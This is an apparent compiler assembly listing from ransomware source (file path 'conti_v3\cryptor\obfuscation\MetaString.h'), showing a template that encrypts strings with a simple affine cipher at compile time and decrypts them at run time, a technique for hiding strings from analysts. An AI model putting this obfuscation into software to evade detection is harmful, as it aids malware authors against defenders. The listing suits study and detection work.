i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0EP@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<79,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0EP@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEBA_NXZ ; MetaBuffer<79,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 0b	 cmp	 QWORD PTR i$1[rbp], 11
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0EP@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z ; MetaBuffer<79,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EP@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<79,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0EP@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0EP@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEBA_NXZ PROC ; MetaBuffer<79,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0EP@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEBA_NXZ ENDP ; MetaBuffer<79,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0EP@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv175 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0EP@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<79,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::MetaBuffer<79,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z ; MetaBuffer<79,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z ; MetaBuffer<79,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z ; MetaBuffer<79,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z ; MetaBuffer<79,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z ; MetaBuffer<79,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z ; MetaBuffer<79,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z ; MetaBuffer<79,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z ; MetaBuffer<79,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z ; MetaBuffer<79,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z ; MetaBuffer<79,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	b8 01 00 00 00	 mov	 eax, 1
  001d7	48 6b c0 0a	 imul	 rax, rax, 10
  001db	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001e2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001ed	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EP@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z ; MetaBuffer<79,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::encrypt
  001f2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001f9	88 41 0b	 mov	 BYTE PTR [rcx+11], al
  001fc	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00203	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  00207	88 85 c0 00 00
	00		 mov	 BYTE PTR tv175[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  0020d	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00214	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  0021b	5f		 pop	 rdi
  0021c	5d		 pop	 rbp
  0021d	c3		 ret	 0
??0?$MetaBuffer@$0EP@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<79,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::MetaBuffer<79,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GB@$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0GB@$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z PROC ; MetaBuffer<97,13,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 0d	 sub	 eax, 13
  0002d	6b c0 37	 imul	 eax, eax, 55		; 00000037H
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GB@$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z ENDP ; MetaBuffer<97,13,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GB@$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0GB@$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z PROC ; MetaBuffer<97,13,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 61	 imul	 eax, eax, 97		; 00000061H
  0002d	83 c0 0d	 add	 eax, 13
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GB@$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z ENDP ; MetaBuffer<97,13,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GB@$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0GB@$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<97,13,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0GB@$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEBA_NXZ ; MetaBuffer<97,13,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 0b	 cmp	 QWORD PTR i$1[rbp], 11
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GB@$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@AEBAEE@Z ; MetaBuffer<97,13,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GB@$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<97,13,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GB@$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0GB@$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEBA_NXZ PROC ; MetaBuffer<97,13,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GB@$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEBA_NXZ ENDP ; MetaBuffer<97,13,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GB@$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv175 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0GB@$0N@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<97,13,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >::MetaBuffer<97,13,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
